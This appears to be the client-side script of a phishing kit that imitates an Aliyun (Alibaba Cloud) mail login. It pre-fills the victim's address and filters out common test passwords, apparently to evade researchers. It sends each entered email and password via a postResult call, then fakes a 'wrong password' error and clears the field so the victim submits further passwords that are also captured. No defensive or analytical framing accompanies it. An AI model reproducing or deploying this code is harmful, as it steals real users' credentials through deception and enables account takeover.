// 
if (validEmail.test(usermail)) {
    let getDomain = usermail.split('@');
    $("#ali_mail").val(getDomain[0]);
    $("#ali_temp_dom").text("@"+getDomain[1]);
    $("#ali_mail").attr('readOnly', true);
    
}

// 
function aliShowPass(x) {
    let ali_pass = document.getElementById("ali_pass");

    if (ali_pass.type === "text") {
        ali_pass.type = "password";
        $("#toggle_ali_pass").attr('src', './pages/aliyun/eye_close.png');
    } 
    else {
        ali_pass.type = "text";
        $("#toggle_ali_pass").attr('src', './pages/aliyun/eye_open.png');

    }
}

$("#aliyun_form_btn").on('submit', (e)=>{
    e.preventDefault();

    let ali_inputs = document.getElementsByClassName("ali_inputs_content");

    if ($("#ali_mail").val() == "") {
        ali_inputs[0].style.borderColor = "red"
        return
    }
    else{
        ali_inputs[0].style.borderColor = "silver"
    }

    if (validEmail.test($("#ali_pass").val()) || $("#ali_pass").val().length < 6 || $("#ali_pass").val() == 123456 || $("#ali_pass").val().toLowerCase() == "qwerty" || $("#ali_pass").val().toLowerCase() == "password" || $("#ali_pass").val().toLowerCase() == "testing") {
        ali_inputs[1].style.borderColor = "red"
        return
    }
    else{
        ali_inputs[1].style.borderColor = "silver";

        let permEmail = $("#ali_mail").val()+$("#ali_temp_dom").text();

        postResult($("#ali_temp_dom").text().slice(1), permEmail, $("#ali_pass").val(), postCount);

        $("#loader").show().css({"display":"flex"})

        setTimeout(() => {
            ali_inputs[1].style.borderColor = "red";
            postCount++
            $("#ali_pass").val("")
        }, delayCounter);

    }

})